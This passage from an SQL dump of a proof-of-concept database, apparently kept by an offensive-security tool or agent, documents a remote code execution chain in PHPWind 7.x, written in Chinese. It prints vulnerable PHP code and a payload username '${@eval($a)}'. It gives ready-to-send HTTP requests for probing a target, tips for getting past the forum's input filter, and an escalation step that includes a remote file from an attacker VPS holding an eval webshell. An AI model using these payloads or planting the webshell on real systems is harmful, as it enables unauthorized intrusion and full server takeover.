// --- 362-373: 唯一转义 ---
function savearray($name,$array) {
	$arraydb="\$$name=array(\r\n\t\t";
	foreach ($array as $value1) {
		$arraydb .= ''array('';
		foreach ($value1 as $value2) {
			$arraydb .= ''"''.addslashes($value2).''",'';   // addslashes 不转义 $
		}
		$arraydb .= "),\r\n\t\t";
	}
	$arraydb .= ");\r\n";
	return $arraydb;
}

// 生成的 bank_sort.php 形如：
<?php
$_DESPOSTDB=array(
  array("8916","${@eval($a)}","100","2010-01-01"),
);
?>

// writeover(): require/target105.example.com:231-241
function writeover($filename,$data,$method=''rb+'',$iflock=1,$check=1,$chmod=1){
	$filename = Pcv($filename,$check);   // Pcv 堵 :// \0 ..
	touch($filename); $handle = fopen($filename,$method);
	$iflock && flock($handle,LOCK_EX);
	fwrite($handle,$data);
	$method==''rb+'' && ftruncate($handle,strlen($data));
	fclose($handle);
	$chmod && @chmod($filename,0777);    // ← 落盘 0777
}',NULL,0,'源码级确认（7.5 SP3 + 8.7 对照），未对目标发包验证。目标为 7.3.2，该文件在 7.3.2 是否存在需 1 包探测 example.com?H_name=bank 是否返回银行页面（而非 hack_error）。',7,NULL,NULL,NULL,NULL,NULL,'phpwind,savearray,变量插值,写码执行,bbscache,8.7未修','exploit','2026-10-06T11:37:16.119Z','2026-10-19T07:09:17.274Z');
INSERT INTO poc (id,code,title,kind,category,cve,component,versions,severity,language,source,source_url,description,usage,content,path,verified,verified_note,hit_count,used_on,engagement_id,engagement_name,asset_target,found_by_agent,tags,created_by,created_at,updated_at) VALUES (201,'phpwind-global.php-initgp-array-u-a-装载-a-但被无条件-unset-eval-a-取不到值的判据','PHPWind global.php InitGP(array(''u'',''a'')) 装载 $a 但被无条件 unset —— ${@eval($a)} 取不到值的判据','poc','rce',NULL,'PHPWind 7.5 SP3 global.php','7.5 SP3（7.3.2 未验证）','high','php','self',NULL,'目标上已存在前人注册的用户名 ${@eval($a)}(uid=8916) 与 ${@eval($_)} (uid=8913)，11/8 字节，恰在 username 12 字节上限内。要让它们在 bank_sort.php 的 "${expr}" 里求值，需要 $a 或 $_ 是裸全局变量。InitGP()（require/target105.example.com:605-620）确实把 $_GET[$key]/$_POST[$key] 写进 $GLOBALS[$key]，且 target116.example.com:233 有 InitGP(array(''u'',''a''))。但 target116.example.com:241 在同一层作用域无条件执行 unset($u,$a,$cookie_userads)，且该 InitGP 的触发条件极苛刻（$db_ads 为真、!$windid 未登录、strlen($_GET[''a''])<16、Referer 不含本站 Host）。$_ 从未被任何 InitGP 装载。故 7.5 SP3 上两者都取不到值 → 死 payload。','1 个包即可判定目标（7.3.2）是否与 7.5 SP3 不同：
  GET /bbs/example.com?H_name=bank&a=echo%20123%3B HTTP/1.1
  Host: example.com
  Cookie: <登录 cookie>
  Referer: 留空或非本站
注意：a 的值里绝对不能出现右括号 )，否则 target116.example.com:59-61 的 CheckVar 会把它替换成 &#41; 造成 PHP 语法错误。同理 = < .. 也会被转义。
判定：页面（bank 排行榜区域）出现 123 → $a 可控，RCE 成立；
      页面无 123 且无报错 → $a 被 unset 或从未装载，此路不通。
升级利用（若 123 出现且 allow_url_fopen=On）：
  GET /bbs/example.com?H_name=bank&a=include$_POST[0];
  POST 0=http://<VPS>/p.txt        （p.txt 内容：<?php eval($_POST[1]);?>）
  两个包，POST 字段名 0 的值不含 ) = < ，可穿过 CheckVar。','// require/target105.example.com:605-620 —— PHPWind 的“register_globals 等价物”
function InitGP($keys,$method=null,$cvtype=1){
	!is_array($keys) && $keys = array($keys);
	foreach ($keys as $key) {
		if ($key == ''GLOBALS'') continue;
		$GLOBALS[$key] = NULL;
		if ($method != ''P'' && isset($_GET[$key])) {
			$GLOBALS[$key] = $_GET[$key];          // ← 请求参数进裸全局变量
		} elseif ($method != ''G'' && isset($_POST[$key])) {
			$GLOBALS[$key] = $_POST[$key];
		}
		if (isset($GLOBALS[$key]) && !empty($cvtype) || $cvtype==2) {
			$GLOBALS[$key] = Char_cv($GLOBALS[$key],$cvtype==2,true);   // 默认 cvtype=1 → Char_cv
		}
	}
}

